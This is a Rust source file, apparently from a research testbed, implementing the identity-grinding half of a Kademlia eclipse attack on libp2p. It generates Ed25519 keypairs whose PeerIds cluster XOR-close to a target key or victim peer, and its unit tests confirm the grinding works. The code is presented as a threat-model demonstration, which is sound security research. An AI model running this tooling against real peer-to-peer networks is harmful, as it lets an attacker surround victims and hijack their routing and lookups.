//! The attack side: grinding Ed25519 keypairs whose `PeerId` lands XOR-closest
//! to a chosen target key.
//!
//! This is the part that demonstrates the threat model. A libp2p peer ID is
//! `multihash(pubkey)` with no additional constraint, so producing IDs that
//! cluster around a target costs only keypair generation. Everything the
//! attacker sends afterwards is validly signed — which is precisely why record
//! authentication (py-libp2p #1348 / #1339) does not touch this attack.

use std::{collections::BinaryHeap, time::Instant};

// Via the `libp2p` facade, NOT a direct `libp2p-identity` dependency.
// See the note in Cargo.toml.
use libp2p::{identity::Keypair, kad::KBucketKey, PeerId};

/// A ground-out identity: the keypair, its peer ID, and how close it landed.
pub struct GroundIdentity {
    pub keypair: Keypair,
    pub peer_id: PeerId,
    pub distance: libp2p::kad::KBucketDistance,
}

impl std::fmt::Debug for GroundIdentity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("GroundIdentity")
            .field("peer_id", &self.peer_id)
            .field("ilog2_distance", &self.distance.ilog2())
            .finish_non_exhaustive()
    }
}

/// Grinds peer IDs toward a target key in Kademlia XOR space.
pub struct TargetedIdGenerator {
    target: KBucketKey<Vec<u8>>,
    best_n: usize,
}

impl TargetedIdGenerator {
    /// Target an arbitrary DHT key (what a `GET_VALUE` eclipse aims at).
    pub fn for_key(key: impl Into<Vec<u8>>) -> Self {
        Self {
            target: KBucketKey::new(key.into()),
            best_n: 20,
        }
    }

    /// Target the region around a specific peer (what a routing eclipse of a
    /// single victim aims at).
    pub fn for_peer(peer: PeerId) -> Self {
        Self {
            target: KBucketKey::new(peer.to_bytes()),
            best_n: 20,
        }
    }

    /// How many identities to keep. Default 20 = the libp2p `k` value, i.e. one
    /// full bucket.
    pub fn best_n(mut self, n: usize) -> Self {
        self.best_n = n;
        self
    }

    /// Run `trials` keypair generations and return the `best_n` closest,
    /// sorted nearest-first.
    ///
    /// Uses a bounded max-heap so memory is O(best_n) rather than O(trials) —
    /// this matters at the 10M-trial end where the interesting numbers live.
    pub fn generate(&self, trials: usize) -> GrindResult {
        let started = Instant::now();
        // Reverse => BinaryHeap behaves as a max-heap on distance, so `peek` is
        // the worst kept candidate and is the one to evict.
        let mut heap: BinaryHeap<(libp2p::kad::KBucketDistance, usize)> = BinaryHeap::new();
        let mut kept: Vec<Option<(Keypair, PeerId)>> = Vec::with_capacity(self.best_n + 1);

        for _ in 0..trials {
            let kp = Keypair::generate_ed25519();
            let peer_id = PeerId::from(kp.public());
            let distance = KBucketKey::from(peer_id).distance(&self.target);

            if heap.len() < self.best_n {
                kept.push(Some((kp, peer_id)));
                heap.push((distance, kept.len() - 1));
            } else if let Some(&(worst, worst_idx)) = heap.peek() {
                if distance < worst {
                    heap.pop();
                    kept[worst_idx] = Some((kp, peer_id));
                    heap.push((distance, worst_idx));
                }
            }
        }

        // `into_sorted_vec` yields ascending order, and the tuple sorts on
        // `distance` first — so this is already nearest-first.
        let out: Vec<GroundIdentity> = heap
            .into_sorted_vec()
            .into_iter()
            .filter_map(|(distance, idx)| {
                kept[idx].take().map(|(keypair, peer_id)| GroundIdentity {
                    keypair,
                    peer_id,
                    distance,
                })
            })
            .collect();

        GrindResult {
            identities: out,
            trials,
            elapsed: started.elapsed(),
        }
    }
}

pub struct GrindResult {
    pub identities: Vec<GroundIdentity>,
    pub trials: usize,
    pub elapsed: std::time::Duration,
}

impl GrindResult {
    /// Identities produced per second — the headline "the attack is cheap" number.
    pub fn rate(&self) -> f64 {
        self.trials as f64 / self.elapsed.as_secs_f64().max(f64::EPSILON)
    }

    /// The `ilog2` of the closest distance achieved. Higher common-prefix means
    /// deeper penetration toward the target; compare against the value an honest
    /// network of size N would naturally produce (~log2(N)).
    pub fn best_cpl(&self) -> Option<u32> {
        self.identities
            .first()
            .and_then(|g| g.distance.ilog2())
            .map(|l| 255 - l)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn grinding_beats_random_placement() {
        let target = b"kad-eclipse-testbed/test-target".to_vec();
        let gen = TargetedIdGenerator::for_key(target.clone()).best_n(4);

        let ground = gen.generate(4_000);
        let random = gen.generate(4);

        let best_ground = ground.identities.first().map(|g| g.distance).unwrap();
        let best_random = random.identities.first().map(|g| g.distance).unwrap();

        // 1000x the trials should reliably land closer. Probabilistic, but the
        // margin is enormous; if this flakes the heap eviction is wrong.
        assert!(
            best_ground < best_random,
            "grinding did not improve on random placement"
        );
    }

    #[test]
    fn keeps_exactly_best_n_sorted_nearest_first() {
        let gen = TargetedIdGenerator::for_key(b"abc".to_vec()).best_n(8);
        let res = gen.generate(500);
        assert_eq!(res.identities.len(), 8);
        for w in res.identities.windows(2) {
            assert!(w[0].distance <= w[1].distance, "results not sorted");
        }
    }
}
